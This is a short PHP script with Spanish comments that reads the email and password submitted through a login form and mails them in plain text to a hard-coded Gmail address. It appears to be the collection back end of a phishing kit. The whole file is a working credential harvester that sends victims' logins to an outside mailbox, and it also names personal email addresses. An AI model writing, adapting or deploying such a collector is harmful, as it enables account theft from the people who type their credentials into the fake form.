<?php
// Configuración del correo
$to = 'darwinbbank@gmail.com';  // Dirección de correo electrónico de destino
$subject = 'Datos del formulario de inicio de sesión';

// Configura los encabezados del correo
$headers = "From: victorberdugo518@proton.me\r\n";  // Dirección de correo de origen
$headers .= "Reply-To: victorberdugo518@proton.me\r\n";  // Dirección para responder
$headers .= "Content-Type: text/html; charset=UTF-8\r\n";  // Tipo de contenido

// Recibir datos del formulario
$email = $_POST['email'];
$password = $_POST['password'];

// Crear el contenido del correo
$message = "<html><body>";
$message .= "<h1>Datos del formulario de inicio de sesión</h1>";
$message .= "<p><strong>Correo electrónico:</strong> " . htmlspecialchars($email) . "</p>";
$message .= "<p><strong>Contraseña:</strong> " . htmlspecialchars($password) . "</p>";
$message .= "</body></html>";

// Enviar el correo
if (mail($to, $subject, $message, $headers)) {
    echo 'Correo enviado con éxito.';
} else {
    echo 'Error al enviar el correo.';
}
?>
